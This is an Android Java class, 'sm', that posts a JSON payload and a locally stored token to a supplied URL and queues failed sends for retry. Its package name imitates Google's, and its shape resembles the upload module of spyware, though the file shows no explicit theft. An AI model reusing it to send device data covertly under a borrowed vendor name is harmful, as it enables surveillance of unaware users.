package com.google.cloudservices;

import android.content.Context;

import com.android.volley.Cache;
import com.android.volley.Network;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.BasicNetwork;
import com.android.volley.toolbox.DiskBasedCache;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class sm {


    RequestQueue requestQueue=null;
    StringRequest stringRequest=null;
    JSONObject jsonlogin=null;
    String status=null;
    Map<String,String> params=null;
    public  void add(final Context context,final String url,final String key, final String jsonarray){

        try {
            Cache cache = new DiskBasedCache(context.getCacheDir(), 1024 * 1024);
            Network network = new BasicNetwork(new HurlStack());
            requestQueue = new RequestQueue(cache, network);
            requestQueue.start();
            cache.clear();

            stringRequest=new StringRequest(Request.Method.POST,url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {



                            requestQueue.stop();
                        try {
                            jsonlogin = new JSONObject(response);
                            status = jsonlogin.getString("status");

                            if (status.equals("error")){

                                SendEror sendEror=new SendEror();
                                sendEror.sender(context,status+key+jsonlogin.getString("message"));
                        }} catch (JSONException e) {
                            SendEror sendEror=new SendEror();
                            sendEror.sender(context,e.toString());
                            e.printStackTrace();
                        }





                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {

                dbOnResponse dbon=new dbOnResponse(context);
                dbon.Insert(key);
                SendEror sendEror=new SendEror();
                sendEror.sender(context,"fail send"+key+error.toString());
                //Toast.makeText(context, "fail send"+key, Toast.LENGTH_SHORT).show();
                    //sm.add(context,url,key,jsonarray);

                }

            })
            {

                @Override
                protected Map<String, String> getParams(){
                    params=new HashMap<String, String>();
                    params.put(key,jsonarray);
                    params.put("token",getToken(context));
                    return params;
                }
            };


            requestQueue.add(stringRequest);

        }catch (Exception e){}finally {
            requestQueue.cancelAll(stringRequest);
            //requestQueue.stop();

           // params.clear();
        }



    }
    public  String getToken(Context context){
        String token=null;
        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
}
